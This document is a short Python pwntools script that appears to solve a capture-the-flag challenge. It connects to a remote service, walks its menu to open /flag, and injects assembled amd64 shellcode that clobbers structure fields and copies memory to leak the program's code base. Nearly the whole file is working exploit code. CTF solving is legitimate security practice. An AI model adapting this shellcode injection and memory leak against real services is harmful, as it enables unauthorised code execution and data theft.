from pwn import *

context.arch = 'amd64'

#r = process("./challenge")
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))

def run_sc(sc, fpath=b'/dev/stdin'):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'> ', fpath)
    #r.sendlineafter(b'> ', b'/proc/self/fd/0')
    r.send(sc)

def check():
    r.sendlineafter(b'Choice: ', b'2')

# leak code base
sc = asm("""
        mov rax, [rbp-0x28]
        mov dword ptr [rax+0], 0
        mov dword ptr [rax+4], 0
        mov qword ptr [rax+0x50], 0
        mov qword ptr [rax+0x58], r13

        lea rbx, [rax+0xc]
        lea rcx, [rdx-0x2000]
""") + asm(shellcraft.amd64.memcpy('rbx', 'rcx', 0x40) + shellcraft.linux.exit(0x41414141))

r.sendlineafter(b'Choice: ', b'1')
r.sendlineafter(b'> ', b'/flag')
r.sendlineafter(b'Choice: ', b'1')
r.sendlineafter(b'> ', b'/flag')

#gdb.attach(r, 'pie b *0x197F')
#input(">>")
run_sc(sc + b'A'*0x80)
time.sleep(1)

check()

print(r.recvuntil(b'Took'))
